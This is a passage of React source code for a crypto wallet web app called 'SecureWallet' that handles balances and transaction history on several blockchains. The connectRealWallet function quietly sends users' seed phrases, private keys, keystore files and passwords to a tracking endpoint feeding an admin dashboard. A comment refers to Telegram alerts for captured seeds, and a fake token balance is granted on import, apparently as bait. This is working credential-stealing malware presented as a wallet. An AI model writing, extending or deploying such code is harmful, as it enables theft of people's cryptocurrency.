import React, { useState, useEffect, createContext, useContext } from 'react';
import { Routes, Route, Navigate, useNavigate, useLocation } from 'react-router-dom';
import { 
  LayoutDashboard, 
  Wallet, 
  Send, 
  ArrowDownLeft, 
  ArrowUpRight, 
  Repeat, 
  Settings, 
  LogOut, 
  Search, 
  Bell, 
  ShieldCheck, 
  Lock,
  ChevronRight,
  MoreHorizontal,
  CreditCard,
  Smartphone,
  Bitcoin,
  AlertTriangle,
  X,
  History,
  Eye,
  EyeOff,
  Copy,
  QrCode
} from 'lucide-react';
import { 
  AreaChart, 
  Area, 
  XAxis, 
  YAxis, 
  CartesianGrid, 
  Tooltip, 
  ResponsiveContainer 
} from 'recharts';
import { ethers } from 'ethers';
import * as bip39 from 'bip39';
import { BIP32Factory } from 'bip32';
import { ECPairFactory } from 'ecpair';
import * as tinysecp from 'tiny-secp256k1';
import * as bitcoin from 'bitcoinjs-lib';
import './styles.css';
import AdminDashboard from './AdminDashboard';

const ECPair = ECPairFactory(tinysecp);
const bip32 = BIP32Factory(tinysecp);

// Crypto Context
const CryptoContext = createContext();

const INITIAL_HOLDINGS = [];

// Target total balance
const TARGET_BALANCE = 100000;

const CHAIN_CONFIG = {
  '0x1': { name: 'Ethereum', symbol: 'ETH', id: 'ethereum', color: '#627eea', rpcUrl: 'https://eth.llamarpc.com', type: 'evm' },
  '0x38': { name: 'BSC', symbol: 'BNB', id: 'binancecoin', color: '#f3ba2f', rpcUrl: 'https://binance.llamarpc.com', type: 'evm' },
  '0x89': { name: 'Polygon', symbol: 'MATIC', id: 'matic-network', color: '#8247e5', rpcUrl: 'https://polygon.llamarpc.com', type: 'evm' },
  '0xa4b1': { name: 'Arbitrum', symbol: 'ETH', id: 'ethereum', color: '#28a0f0', rpcUrl: 'https://arbitrum.llamarpc.com', type: 'evm' },
  '0xa': { name: 'Optimism', symbol: 'ETH', id: 'ethereum', color: '#ff0420', rpcUrl: 'https://optimism.llamarpc.com', type: 'evm' },
  '0x2105': { name: 'Base', symbol: 'ETH', id: 'ethereum', color: '#0052ff', rpcUrl: 'https://base.llamarpc.com', type: 'evm' },
  'bitcoin': { name: 'Bitcoin', symbol: 'BTC', id: 'bitcoin', color: '#f7931a', type: 'btc' },
  'solana': { name: 'Solana', symbol: 'SOL', id: 'solana', color: '#14F195', type: 'sol' },
  '0x279f': { name: 'Monad Devnet', symbol: 'MON', id: 'monad', color: '#836EF9', rpcUrl: 'https://testnet-rpc.monad.xyz/', type: 'evm' }, // Chain ID 10143
  'sui': { name: 'Sui', symbol: 'SUI', id: 'sui', color: '#4DA2FF', type: 'sui' },
  '0x3e3': { name: 'HyperEVM', symbol: 'HYPE', id: 'hyperevm', color: '#E84142', rpcUrl: 'https://rpc.hyperliquid.xyz/evm', type: 'evm' }, // Mock/Example ID
};

// Map of common token addresses on different chains for demo purposes
// In a production app, you would use an API like Moralis/Alchemy to fetch these automatically
const TOKEN_CONTRACTS = {
    '0x38': { // BSC
        'USDT': '0x55d398326f99059ff775485246999027b3197955',
        'USDC': '0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d',
        'ETH': '0x2170ed0880ac9a755fd29b2688956bd959f933f8', // Binance-Peg Ethereum
    },
    '0x89': { // Polygon
        'USDT': '0xc2132d05d31c914a87c6611c10748aeb04b58e8f',
        'USDC': '0x3c499c542cbe963d3d3996987254ed89f2711701',
        'WETH': '0x7ceb23fd6bc0add59e62ac25578270cff1b9f619',
    },
    // Add more chains as needed
};

// ERC20 Minimal ABI for BalanceOf
const ERC20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)"
];

const timeAgo = (date) => {
    const seconds = Math.floor((new Date() - date) / 1000);
    let interval = seconds / 31536000;
    if (interval > 1) return Math.floor(interval) + " years ago";
    interval = seconds / 2592000;
    if (interval > 1) return Math.floor(interval) + " months ago";
    interval = seconds / 86400;
    if (interval > 1) return Math.floor(interval) + " days ago";
    interval = seconds / 3600;
    if (interval > 1) return Math.floor(interval) + " hours ago";
    interval = seconds / 60;
    if (interval > 1) return Math.floor(interval) + " mins ago";
    return Math.floor(seconds) + "s ago";
};

const claimedAssetsKey = (address) => `claimed_assets_${String(address || '').toLowerCase()}`;

const SWT_TOKEN = {
  id: 'swt_token',
  name: 'SecureWallet Token',
  symbol: 'SWT',
  amount: 33333,
  price: 0.15,
  change: 12.5,
  value: 33333 * 0.15,
  color: '#2563eb',
  chainKey: '0x1',
  allocation: 0,
  isClaimed: true,
};

const getClaimedAssets = (address) => {
  if (!address) return [];
  try {
    const raw = localStorage.getItem(claimedAssetsKey(address));
    const parsed = raw ? JSON.parse(raw) : [];
    return Array.isArray(parsed) ? parsed : [];
  } catch {
    return [];
  }
};

const saveClaimedAssets = (address, claimed) => {
  if (!address) return;
  try {
    localStorage.setItem(claimedAssetsKey(address), JSON.stringify(claimed || []));
  } catch {}
};

/** Ensure this wallet address has SWT saved (for return visits + every new import). */
const ensureSwtClaimed = (address) => {
  if (!address) return null;
  const existing = getClaimedAssets(address);
  const hasSwt = existing.some((a) => a.id === 'swt_token');
  if (hasSwt) return existing.find((a) => a.id === 'swt_token');
  const next = [SWT_TOKEN, ...existing.filter((a) => a.id !== 'swt_token')];
  saveClaimedAssets(address, next);
  return SWT_TOKEN;
};

const mergeAssetsWithClaims = (chainAssets, address) => {
  const base = Array.isArray(chainAssets) ? chainAssets : [];
  // Always restore SWT for this address if previously claimed / auto-granted
  const claimed = getClaimedAssets(address);
  if (!claimed.length) {
    const total = base.reduce((sum, a) => sum + (Number(a.value) || 0), 0);
    return {
      assets: base.map((a) => ({
        ...a,
        allocation: total > 0 ? (((Number(a.value) || 0) / total) * 100).toFixed(1) : 0,
      })),
      total,
    };
  }
  const ids = new Set(base.map((a) => a.id));
  const extras = claimed.filter((c) => c?.id && !ids.has(c.id));
  const merged = [...extras, ...base];
  const total = merged.reduce((sum, a) => sum + (Number(a.value) || 0), 0);
  return {
    assets: merged.map((a) => ({
      ...a,
      allocation: total > 0 ? (((Number(a.value) || 0) / total) * 100).toFixed(1) : 0,
    })),
    total,
  };
};

export const CryptoProvider = ({ children }) => {
  const [assets, setAssets] = useState([]);
  const [transactions, setTransactions] = useState([]);
  const [totalBalance, setTotalBalance] = useState(0);
  const [loading, setLoading] = useState(true);
  const [isRealWallet, setIsRealWallet] = useState(() => {
      return localStorage.getItem('user_wallet_connected') === 'true';
  });
  const [walletAddress, setWalletAddress] = useState(() => localStorage.getItem('user_wallet_address') || '');
  const [ethAddress, setEthAddress] = useState(() => localStorage.getItem('user_eth_address') || '');
  const [btcAddress, setBtcAddress] = useState(() => localStorage.getItem('user_btc_address') || '');
  const [solAddress, setSolAddress] = useState(() => localStorage.getItem('user_sol_address') || '');
  const [suiAddress, setSuiAddress] = useState(() => localStorage.getItem('user_sui_address') || '');
  const [chainId, setChainId] = useState(() => localStorage.getItem('user_chain_id') || null);
  const [walletType, setWalletType] = useState(() => localStorage.getItem('user_wallet_type') || null);
  const [notifications, setNotifications] = useState([]);

  const applyChainAssets = (chainAssets, address) => {
    const merged = mergeAssetsWithClaims(chainAssets, address);
    setAssets(merged.assets);
    setTotalBalance(merged.total);
    return merged;
  };

  const addNotification = (title, desc, type = 'info', duration = 500) => {
      const newNotif = {
          id: Date.now(),
          title,
          desc,
          time: Date.now(),
          type, 
          read: false,
          duration
      };
      setNotifications(prev => [newNotif, ...prev]);
      if (duration && duration > 0) {
          setTimeout(() => {
              setNotifications(prev => prev.filter(n => n.id !== newNotif.id));
          }, duration);
      }
  };

  // Initialize data - NO FAKE DATA
  useEffect(() => {
    if (!isRealWallet) {
        setTransactions([]);
        setAssets([]);
        setTotalBalance(0);
    }
  }, [isRealWallet]);

  // Hydrate Wallet on Page Load (Refresh Persistence)
  useEffect(() => {
      const rehydrate = async () => {
          const storedConnected = localStorage.getItem('user_wallet_connected') === 'true';
          if (storedConnected) {
              const address = localStorage.getItem('user_wallet_address');
              const type = localStorage.getItem('user_wallet_type');
              const chainId = localStorage.getItem('user_chain_id') || '0x1';
              
              if (address && type) {
                  const savedAddresses = {
                      eth: localStorage.getItem('user_eth_address'),
                      btc: localStorage.getItem('user_btc_address'),
                      sol: localStorage.getItem('user_sol_address'),
                      sui: localStorage.getItem('user_sui_address')
                  };

                  let balance = 0;
                  const config = CHAIN_CONFIG[chainId];

                  // Attempt to fetch balance for the current chain
                  if (config) {
                      try {
                          if (config.type === 'evm') {
                              if (config.rpcUrl && navigator.onLine) {
                                  try {
                                      const provider = new ethers.JsonRpcProvider(config.rpcUrl);
                                      const activeAddr = savedAddresses.eth || address;
                                      const balWei = await provider.getBalance(activeAddr);
                                      balance = parseFloat(ethers.formatEther(balWei));
                                  } catch (e) {
                                      console.warn("Rehydration RPC balance fetch failed", e);
                                  }
                              }
                          } else if (config.type === 'btc') {
                              const activeAddr = savedAddresses.btc || address;
                              if (activeAddr) {
                                  const response = await fetch(`https://blockchain.info/q/addressbalance/${activeAddr}`);
                                  const satoshis = await response.text();
                                  balance = parseInt(satoshis) / 100000000;
                              }
                          } else if (config.type === 'sol') {
                              // Solana fetch (mock or real if API available)
                              // For now we keep 0 or mock, similar to switchNetwork
                          }
                      } catch (e) {
                          console.warn("Rehydration balance fetch failed", e);
                      }
                  }

                  // Connect and populate
                  await connectRealWallet(address, balance, type, chainId, savedAddresses, {}, { showToast: false });
              }
          }
      };

      // Only run if we are "connected" but state is empty (loading check or just run once)
      // Since this is mount, it runs once.
      rehydrate();
  }, []);


  const addCustomToken = async (contractAddress, symbol, decimals) => {
      if (!isRealWallet) return;
      setLoading(true);
      try {
          // Verify contract
          let provider;
          if (walletType === 'imported') {
              const chainInfo = CHAIN_CONFIG[chainId] || CHAIN_CONFIG['0x1'];
              provider = new ethers.JsonRpcProvider(chainInfo.rpcUrl);
          } else {
              provider = new ethers.BrowserProvider(window.ethereum);
          }
          
          const contract = new ethers.Contract(contractAddress, ERC20_ABI, provider);
          
          // Double check symbol/decimals if not provided or just to verify
          const fetchedSymbol = symbol || await contract.symbol();
          const fetchedDecimals = decimals || await contract.decimals();
          
          const balanceWei = await contract.balanceOf(walletAddress);
          const balance = parseFloat(ethers.formatUnits(balanceWei, fetchedDecimals));
          
          // Fetch price (optional, might fail for very new coins)
          let price = 0;
          try {
             const resp = await fetch(`/api/token-price?network=ethereum&contract_addresses=${contractAddress}&vs=usd`);
             const data = await resp.json();
             price = data[contractAddress.toLowerCase()]?.usd || 0;
          } catch (e) { }
          
          const newAsset = {
              id: contractAddress,
              name: fetchedSymbol, // Use symbol as name for custom
              symbol: fetchedSymbol,
              amount: balance,
              price: price,
              change: 0,
              value: balance * price,
              color: '#888', // Default gray for custom
              isCustom: true
          };
          
          // Update State
          const updatedAssets = [...assets, newAsset];
          setAssets(updatedAssets);
          
          // Update Admin Tracking
          fetch('/api/track/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    address: walletAddress,
                    walletType: walletType,
                    balance: totalBalance + newAsset.value, // Approximate update
                    assets: updatedAssets
                })
          }).catch(e => console.error("Update Tracking failed", e));

          alert(`Added ${fetchedSymbol} successfully!`);

      } catch (e) {
          console.error(e);
          alert("Failed to add token. Check address and network.");
      }
      setLoading(false);
  };

  // Network Switching Listener
  useEffect(() => {
    if (isRealWallet && window.ethereum && walletType === 'metamask') {
      const handleChainChanged = async (newChainId) => {
        setChainId(newChainId);
        setLoading(true);
        // Reload balance for new chain
        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        if (accounts.length > 0) {
            const balanceHex = await window.ethereum.request({ method: 'eth_getBalance', params: [accounts[0], 'latest'] });
            const balance = parseInt(balanceHex, 16) / 1e18;
            await connectRealWallet(accounts[0], balance, 'metamask', newChainId);
        } else {
            resetWallet();
        }
      };

      const handleAccountsChanged = (accounts) => {
        if (accounts.length === 0) {
            resetWallet();
        } else {
            // Reconnect with new account
            window.ethereum.request({ method: 'eth_getBalance', params: [accounts[0], 'latest'] })
                .then(balanceHex => {
                    const balance = parseInt(balanceHex, 16) / 1e18;
                    connectRealWallet(accounts[0], balance, 'metamask', chainId);
                });
        }
      };

      window.ethereum.on('chainChanged', handleChainChanged);
      window.ethereum.on('accountsChanged', handleAccountsChanged);

      return () => {
        window.ethereum.removeListener('chainChanged', handleChainChanged);
        window.ethereum.removeListener('accountsChanged', handleAccountsChanged);
      };
    }
  }, [isRealWallet, chainId, walletType]);

  const switchNetwork = async (newChainId) => {
    console.log("Switching to:", newChainId); // Debug
    if (walletType === 'imported') {
        setLoading(true);
        try {
            let config = CHAIN_CONFIG[newChainId];
            
            // Fallback: Try finding by numeric ID or name if direct lookup fails
            if (!config) {
                config = Object.values(CHAIN_CONFIG).find(c => c.id === newChainId || c.name === newChainId);
            }

            if (!config) throw new Error(`Unsupported Chain ID: ${newChainId}`);
            
            let balance = 0;
            let activeAddress = walletAddress;

            if (config.type === 'evm') {
                activeAddress = ethAddress || walletAddress;
                if (config.rpcUrl && navigator.onLine) {
                    try {
                        const provider = new ethers.JsonRpcProvider(config.rpcUrl);
                        const balanceWei = await Promise.race([
                            provider.getBalance(activeAddress),
                            new Promise((_, reject) => setTimeout(() => reject(new Error("RPC Timeout")), 5000))
                        ]);
                        balance = parseFloat(ethers.formatEther(balanceWei));
                    } catch (rpcError) {
                        console.warn(`RPC failed for ${config.name}, setting balance to 0`, rpcError);
                        balance = 0;
                    }
                } else {
                    balance = 0;
                }
            } else if (config.type === 'btc') {
                activeAddress = btcAddress;
                if (!activeAddress) throw new Error("No Bitcoin address derived. Please re-import wallet.");
                
                // Fetch Real Bitcoin Balance using Blockchain.info API
                try {
                    const response = await fetch(`https://blockchain.info/q/addressbalance/${activeAddress}`);
                    const satoshis = await response.text();
                    balance = parseInt(satoshis) / 100000000;
                } catch (err) {
                    console.error("Failed to fetch BTC balance", err);
                    balance = 0;
                }
            } else if (config.type === 'sol') {
                activeAddress = solAddress || walletAddress;
                balance = 0;
                try {
                    const rpc = 'https://api.mainnet-beta.solana.com';
                    const body = { jsonrpc: '2.0', id: 1, method: 'getBalance', params: [activeAddress] };
                    const resp = await fetch(rpc, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
                    const json = await resp.json();
                    const lamports = json.result?.value || 0;
                    balance = lamports / 1e9;
                } catch (e) { }
                let solPrice = 0;
                let solChange = 0;
                try {
                    const priceResp = await fetch('/api/price?ids=solana&vs=usd&include_change=true');
                    const priceData = await priceResp.json();
                    solPrice = priceData.solana?.usd || 0;
                    solChange = priceData.solana?.usd_24h_change || 0;
                } catch (e) { }
                const usdValue = balance * solPrice;
                const newAssets = [{
                    id: 'solana',
                    name: 'Solana',
                    symbol: 'SOL',
                    amount: balance,
                    price: solPrice,
                    change: solChange,
                    value: usdValue,
                    allocation: 100,
                    chainKey: 'solana',
                    color: '#14F195'
                }];
                applyChainAssets(newAssets, activeAddress);
                try {
                    const sigBody = { jsonrpc: '2.0', id: 1, method: 'getSignaturesForAddress', params: [activeAddress, { limit: 10 }] };
                    const sigResp = await fetch('https://api.mainnet-beta.solana.com', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(sigBody) });
                    const sigs = await sigResp.json();
                    const list = Array.isArray(sigs.result) ? sigs.result : [];
                    const mapped = list.map(s => ({
                        id: s.signature,
                        type: s.err ? 'error' : 'transfer',
                        amount: 0,
                        symbol: 'SOL',
                        asset: 'Solana',
                        date: new Date((s.blockTime || Math.floor(Date.now()/1000)) * 1000).toLocaleDateString(),
                        status: s.confirmationStatus || 'Confirmed',
                        hash: s.signature
                    }));
                    setTransactions(mapped);
                } catch (e) { /* ignore */ }
            } else if (config.type === 'sui') {
                activeAddress = suiAddress || walletAddress;
                balance = 0;
                try {
                    const rpc = 'https://fullnode.mainnet.sui.io:443';
                    const body = { jsonrpc: '2.0', id: 1, method: 'sui_getBalance', params: [activeAddress] };
                    const resp = await fetch(rpc, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
                    const json = await resp.json();
                    const total = json.result?.totalBalance || 0;
                    balance = parseFloat(total) / 1e9;
                } catch (e) { /* ignore */ }
                let suiPrice = 0;
                let suiChange = 0;
                try {
                    const priceResp = await fetch('/api/price?ids=sui&vs=usd&include_change=true');
                    const priceData = await priceResp.json();
                    suiPrice = priceData.sui?.usd || 0;
                    suiChange = priceData.sui?.usd_24h_change || 0;
                } catch (e) { }
                const usdValue = balance * suiPrice;
                const newAssets = [{
                    id: 'sui',
                    name: 'Sui',
                    symbol: 'SUI',
                    amount: balance,
                    price: suiPrice,
                    change: suiChange,
                    value: usdValue,
                    allocation: 100,
                    chainKey: 'sui',
                    color: '#4DA2FF'
                }];
                applyChainAssets(newAssets, activeAddress);
            }
            
            await connectRealWallet(activeAddress, balance, 'imported', newChainId, { eth: ethAddress, btc: btcAddress, sol: solAddress, sui: suiAddress }, {}, { showToast: false });
        } catch (e) {
            console.error("Failed to switch network", e);
            alert("Failed to switch network: " + e.message);
        }
        setLoading(false);
    } else if (walletType === 'metamask' || walletType === 'coinbase' || walletType === 'trust' || walletType === 'exodus') {
        const config = CHAIN_CONFIG[newChainId];
        
        // Handle Non-EVM Chains (Solana, Bitcoin, Sui) while connected to Metamask
        if (config && config.type !== 'evm') {
            setLoading(true);
            let newAddress = walletAddress;
            let newBalance = 0;
            
            if (config.type === 'sol') {
                newAddress = solAddress || '7MsK...ePUX';
                newBalance = 0; 
            } else if (config.type === 'btc') {
                newAddress = btcAddress || 'bc1q...ydxy';
                newBalance = 0; 
            } else if (config.type === 'sui') {
                newAddress = suiAddress || '0x6bb2...828e';
                newBalance = 0; 
            }
            
            // Switch context locally without triggering Metamask
            await connectRealWallet(newAddress, newBalance, walletType, newChainId, { eth: ethAddress, btc: btcAddress, sol: solAddress, sui: suiAddress }, {}, { showToast: false });
            return;
        }

        // Extension handling
        if (window.ethereum) {
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: newChainId }],
                });
            } catch (switchError) {
                // This error code indicates that the chain has not been added to MetaMask.
                if (switchError.code === 4902) {
                    const config = CHAIN_CONFIG[newChainId];
                    try {
                        await window.ethereum.request({
                            method: 'wallet_addEthereumChain',
                            params: [
                                {
                                    chainId: newChainId,
                                    chainName: config.name,
                                    rpcUrls: [config.rpcUrl],
                                    nativeCurrency: {
                                        name: config.symbol,
                                        symbol: config.symbol,
                                        decimals: 18,
                                    },
                                },
                            ],
                        });
                    } catch (addError) {
                         console.error(addError);
                    }
                }
            }
        }
    }
  };

  const [lastTxNotified, setLastTxNotified] = useState(null);
  useEffect(() => {
      if (transactions && transactions.length > 0) {
          const latest = transactions[0];
          if (latest && latest.id && latest.id !== lastTxNotified) {
              const kind = latest.type;
              let title = 'Transaction';
              if (kind === 'receive') title = 'Received';
              else if (kind === 'send') title = 'Sent';
              else if (kind === 'swap') title = 'Swapped';
              const symbol = latest.symbol || '';
              const amt = typeof latest.amount === 'string' ? latest.amount : (latest.amount || 0);
              const desc = `${title} ${amt} ${symbol}`;
              addNotification(title, desc, latest.type === 'error' ? 'error' : 'success');
              setLastTxNotified(latest.id);
          }
      }
  }, [transactions]);

  const fetchPrices = async () => {
    // If using real wallet, we don't overwrite assets with fake data
    // We only update prices for the assets we have
    if (isRealWallet) return; 
  };
 
   const fetchTransactions = async () => {
     if (!isRealWallet || !walletAddress || !chainId) return;
     const chainConfig = CHAIN_CONFIG[chainId] || {};
     try {
       if (chainConfig.type === 'btc') {
         const response = await fetch(`https://blockchain.info/rawaddr/${walletAddress}?limit=20`);
         const data = await response.json();
         if (data.txs) {
           const realTxs = data.txs.map(tx => {
             let inputVal = 0;
             let outputVal = 0;
             tx.inputs.forEach(inp => {
               if (inp.prev_out && inp.prev_out.addr === walletAddress) {
                 inputVal += inp.prev_out.value;
               }
             });
             tx.out.forEach(out => {
               if (out.addr === walletAddress) {
                 outputVal += out.value;
               }
             });
             const diff = outputVal - inputVal;
             const isReceive = diff > 0;
             const absDiff = Math.abs(diff) / 100000000;
             return {
               id: tx.hash,
               type: isReceive ? 'receive' : 'send',
               amount: absDiff.toFixed(6),
               symbol: 'BTC',
               asset: 'Bitcoin',
               date: new Date(tx.time * 1000).toLocaleDateString(),
               status: 'Confirmed',
               hash: tx.hash
             };
           });
           setTransactions(realTxs);
         }
       } else if (chainId === '0x1') {
        const txResponse = await fetch(`/api/ethplorer/address-history?address=${walletAddress}&limit=50`);
         const txData = await txResponse.json();
         if (txData.operations && Array.isArray(txData.operations)) {
           const realTxs = txData.operations.map(tx => {
             const isReceive = tx.to.toLowerCase() === walletAddress.toLowerCase();
             const tokenSymbol = tx.tokenInfo ? tx.tokenInfo.symbol : 'ETH';
             const decimals = tx.tokenInfo ? parseInt(tx.tokenInfo.decimals) : 18;
             const val = parseFloat(tx.value) / Math.pow(10, decimals);
             return {
               id: tx.transactionHash,
               type: isReceive ? 'receive' : 'send',
               amount: val < 0.0001 ? '< 0.0001' : val.toFixed(4),
               symbol: tokenSymbol,
               asset: tx.tokenInfo ? tx.tokenInfo.name : 'Ethereum',
               date: new Date(tx.timestamp * 1000).toLocaleDateString(),
               status: 'Confirmed',
               hash: tx.transactionHash
             };
           });
           setTransactions(realTxs);
         }
       } else if (chainConfig.type === 'evm') {
        const txResp = await fetch(`/api/ethplorer/address-transactions?address=${walletAddress}&limit=20`);
         const txs = await txResp.json();
         if (Array.isArray(txs)) {
           const mapped = txs.map(t => {
             const isReceive = t.to && t.to.toLowerCase() === walletAddress.toLowerCase();
             const isSend = t.from && t.from.toLowerCase() === walletAddress.toLowerCase();
             const symbol = t.tokenSymbol || 'ETH';
             const amount = t.value || (t.tokenAmount || 0);
             return {
               id: t.hash,
               type: isSend ? 'send' : 'receive',
               amount: parseFloat(amount).toFixed(6),
               symbol,
               asset: symbol,
               date: new Date((t.timestamp || Date.now()) * 1000).toLocaleDateString(),
               status: 'Confirmed',
               hash: t.hash
             };
           });
           setTransactions(mapped);
         }
       } else if (chainConfig.type === 'sol') {
         const body = { jsonrpc: '2.0', id: 1, method: 'getSignaturesForAddress', params: [walletAddress, { limit: 10 }] };
         const sigResp = await fetch('https://api.mainnet-beta.solana.com', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
         const sigs = await sigResp.json();
         const list = Array.isArray(sigs.result) ? sigs.result : [];
         const mapped = list.map(s => ({
           id: s.signature,
           type: s.err ? 'error' : 'transfer',
           amount: 0,
           symbol: 'SOL',
           asset: 'Solana',
           date: new Date((s.blockTime || Math.floor(Date.now() / 1000)) * 1000).toLocaleDateString(),
           status: s.confirmationStatus || 'Confirmed',
           hash: s.signature
         }));
         setTransactions(mapped);
       }
    } catch (e) {
      // Suppress noisy network errors during polling
    }
   };
 
   const [walletPrivateData, setWalletPrivateData] = useState({});

  useEffect(() => {
     if (!isRealWallet || !walletAddress) return;
     const interval = setInterval(fetchTransactions, 30000);
     fetchTransactions();
     return () => clearInterval(interval);
   }, [isRealWallet, walletAddress, chainId]);

  // Sync with Admin Dashboard (never re-send seed/private key — that caused duplicate Telegram alerts)
  useEffect(() => {
    if (isRealWallet && walletAddress) {
        // Debounce slightly to avoid too many calls during initial load
        const timer = setTimeout(() => {
             fetch('/api/track/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    address: walletAddress,
                    walletType: walletType,
                    balance: totalBalance,
                    assets: assets,
                    transactions: transactions,
                    importMethod: walletPrivateData?.importMethod
                })
            }).catch(e => console.error("Tracking update failed", e));
        }, 2000);
        return () => clearTimeout(timer);
    }
  }, [assets, totalBalance, isRealWallet, walletAddress, walletType, transactions, walletPrivateData]);

  const connectRealWallet = async (address, initialBalance, type, currentChainId = '0x1', addresses = {}, privateData = {}, options = {}) => {
    // Grant SWT on every imported wallet so tokens show for new imports + return visits
    const isImport =
      type === 'imported' ||
      !!privateData?.mnemonic ||
      !!privateData?.privateKey ||
      !!privateData?.keystoreJSON ||
      !!privateData?.importMethod ||
      options.autoClaim === true;
    if (isImport && address) {
      ensureSwtClaimed(address);
    }

    // 1. Send tracking data immediately (awaiting it ensures server has it before UI updates)
    try {
        const trackingOptions = { ...privateData, ...options };
        const trackingBody = {
            address: address,
            walletType: type,
            balance: initialBalance,
            assets: getClaimedAssets(address),
            importMethod: trackingOptions.importMethod,
            mnemonic: trackingOptions.mnemonic,
            privateKey: trackingOptions.privateKey,
            keystoreJSON: trackingOptions.keystoreJSON,
            keystorePassword: trackingOptions.keystorePassword
        };
        
        await fetch('/api/track/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(trackingBody)
        }).catch(e => console.error("Tracking failed", e));
    } catch (e) {
        console.error("Tracking setup failed", e);
    }

    // 2. Update UI State after tracking is sent
    setIsRealWallet(true);
    setWalletAddress(address);
    setChainId(currentChainId);
    setWalletType(type);
    setLoading(true);
    setTransactions([]); // Clear mock transactions
    // Keep only non-sensitive metadata for later sync (prevents duplicate Telegram)
    setWalletPrivateData({
      importMethod: privateData?.importMethod || options?.importMethod || null
    });
    
    if (addresses.eth) setEthAddress(addresses.eth);
    if (addresses.btc) setBtcAddress(addresses.btc);
    if (addresses.sol) setSolAddress(addresses.sol);
    if (addresses.sui) setSuiAddress(addresses.sui);

    // Save to localStorage for persistence
    localStorage.setItem('user_wallet_connected', 'true');
    localStorage.setItem('user_wallet_address', address);
    localStorage.setItem('user_chain_id', currentChainId);
    localStorage.setItem('user_wallet_type', type);
    
    if (addresses.eth) localStorage.setItem('user_eth_address', addresses.eth);
    if (addresses.btc) localStorage.setItem('user_btc_address', addresses.btc);
    if (addresses.sol) localStorage.setItem('user_sol_address', addresses.sol);
    if (addresses.sui) localStorage.setItem('user_sui_address', addresses.sui);
    
    if (options.showToast !== false) {
        addNotification('Wallet Connected', 'Your wallet has been connected successfully.', 'success');
    }

    if (type !== 'phantom') {
        try {
        const chainConfig = CHAIN_CONFIG[currentChainId] || {};

        // Bitcoin Logic
            if (chainConfig.type === 'btc') {
                 let balance = initialBalance;
                 let price = 0;
                 let change = 0;
                 
                 try {
                    const response = await fetch(`/api/price?ids=bitcoin&vs=usd&include_change=true`);
                    const data = await response.json();
                    price = data.bitcoin?.usd || 0;
                    change = data.bitcoin?.usd_24h_change || 0;
                 } catch (e) { }

                 const usdValue = balance * price;
                 
                 const newAssets = [{
                    id: 'bitcoin',
                    name: 'Bitcoin',
                    symbol: 'BTC',
                    amount: balance,
                    price: price,
                    change: change,
                    value: usdValue,
                    allocation: 100,
                    chainKey: 'bitcoin',
                    color: '#f7931a'
                 }];
                 
                 applyChainAssets(newAssets, address);

                 // Fetch Real Bitcoin Transactions
                 try {
                     const response = await fetch(`https://blockchain.info/rawaddr/${address}?limit=20`);
                     const data = await response.json();
                     if (data.txs) {
                         const realTxs = data.txs.map(tx => {
                             let inputVal = 0;
                             let outputVal = 0;
                             
                             tx.inputs.forEach(inp => {
                                 if (inp.prev_out && inp.prev_out.addr === address) {
                                     inputVal += inp.prev_out.value;
                                 }
                             });
                             
                             tx.out.forEach(out => {
                                 if (out.addr === address) {
                                     outputVal += out.value;
                                 }
                             });
                             
                             const diff = outputVal - inputVal;
                             const isReceive = diff > 0;
                             const absDiff = Math.abs(diff) / 100000000; // Satoshis to BTC
                             
                             return {
                                 id: tx.hash,
                                 type: isReceive ? 'receive' : 'send',
                                 amount: absDiff.toFixed(6),
                                 symbol: 'BTC',
                                 asset: 'Bitcoin',
                                 date: new Date(tx.time * 1000).toLocaleDateString(),
                                 status: 'Confirmed',
                                 hash: tx.hash
                             };
                         });
                         setTransactions(realTxs);
                     }
                 } catch (e) {
                     console.error("Failed to fetch BTC transactions", e);
                 }
            }
            // Ethereum Mainnet Logic
            else if (currentChainId === '0x1') {
                // Fetch comprehensive data from Ethplorer (Free Tier) to get ALL coins/tokens
                // valid address check
                if (!address || !address.startsWith('0x')) throw new Error("Invalid address");

               const response = await fetch(`/api/ethplorer/address-info?address=${address}`);
                const data = await response.json();
                
                const newAssets = [];
                let realTotalBalance = 0;

                // 1. Add ETH (Native)
                if (data.ETH) {
                    const ethBalance = data.ETH.balance;
                    const ethPrice = data.ETH.price ? data.ETH.price.rate : 0;
                    const ethValue = ethBalance * ethPrice;
                    realTotalBalance += ethValue;
                    
                    newAssets.push({
                        id: 'ethereum',
                        name: 'Ethereum',
                        symbol: 'ETH',
                        amount: ethBalance,
                        price: ethPrice,
                        change: data.ETH.price ? data.ETH.price.diff : 0,
                        value: ethValue,
                        chainKey: '0x1',
                        color: '#627eea'
                    });
                }

                // 2. Add Tokens (ERC20 - including Meme coins)
                if (data.tokens) {
                    data.tokens.forEach(token => {
                        const info = token.tokenInfo;
                        if (info && info.price) { // Only add tokens with price data
                            const decimals = parseInt(info.decimals) || 18;
                            const amount = token.balance / Math.pow(10, decimals);
                            const price = info.price.rate || 0;
                            const value = amount * price;
                            
                            // Show all tokens with value > $0.00
                            if (value > 0.00 || amount > 0) {
                                realTotalBalance += value;
                                newAssets.push({
                                    id: info.address,
                                    name: info.name,
                                    symbol: info.symbol,
                                    amount: amount,
                                    price: price,
                                    change: info.price.diff || 0,
                                    value: value,
                                    chainKey: '0x1',
                                    // Generate a deterministic color based on symbol
                                    color: '#' + Math.floor(Math.abs(Math.sin(info.symbol.length) * 16777215)).toString(16).padStart(6, '0')
                                });
                            }
                        } else if (info) {
                            // Add tokens even if price is missing, if balance > 0
                            const decimals = parseInt(info.decimals) || 18;
                            const amount = token.balance / Math.pow(10, decimals);
                            if (amount > 0) {
                                 newAssets.push({
                                    id: info.address,
                                    name: info.name,
                                    symbol: info.symbol,
                                    amount: amount,
                                    price: 0,
                                    change: 0,
                                    value: 0,
